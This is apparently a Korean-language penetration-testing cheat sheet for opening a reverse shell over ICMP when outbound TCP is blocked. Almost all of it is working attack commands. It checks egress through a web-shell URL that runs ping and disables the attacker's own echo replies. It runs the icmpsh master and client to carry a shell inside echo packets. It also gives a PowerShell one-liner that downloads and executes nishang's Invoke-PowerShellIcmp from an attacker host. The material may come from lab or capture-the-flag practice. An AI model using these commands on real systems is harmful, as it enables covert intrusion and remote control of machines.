# icmp reverse shell

TCP outbound가 전부 막히고 ICMP만 나갈 때의 마지막 수단. echo 요청·응답 안에 명령과 출력을 싣는다.

```text
[타깃]   icmpsh -t <공격자 IP>      ICMP echo에 셸 출력을 싣는다
[공격자] icmpsh_m.py                요청을 받아 실행할 명령을 싣는다
```

## egress 확인 (먼저)

웹셸에서 ping을 치고 공격자에서 관찰한다.

```bash
sudo tcpdump -i tun0 icmp    # echo 요청이 보이면 가능
```

```text
http://target/files/ftp/web.php?cmd=ping -c 1 10.10.10.10
```

## 공격자 준비 (Linux·Windows 공통)

icmpsh이 echo 응답을 셸 통신으로 소비하므로 자기 echo 응답을 먼저 끈다.

```bash
sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1    # 끝나면 반드시 0 으로 복구
```

## Linux 타깃 — icmpsh

```bash
# 공격자 (icmpsh 저장소)
python3 icmpsh_m.py 10.10.10.10 10.10.20.5    # (공격자 IP) (타깃 IP)

# 타깃 (icmpsh 바이너리 또는 icmpsh-s.py 전달해 실행)
./icmpsh -t 10.10.10.10
```

## Windows 타깃 — nishang Invoke-PowerShellIcmp

ps1은 http.server로 서빙해 둔다. 타깃에서:

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/Invoke-PowerShellIcmp.ps1');Invoke-PowerShellIcmp -LHOST 10.10.10.10
```

## 마무리

```bash
sudo sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
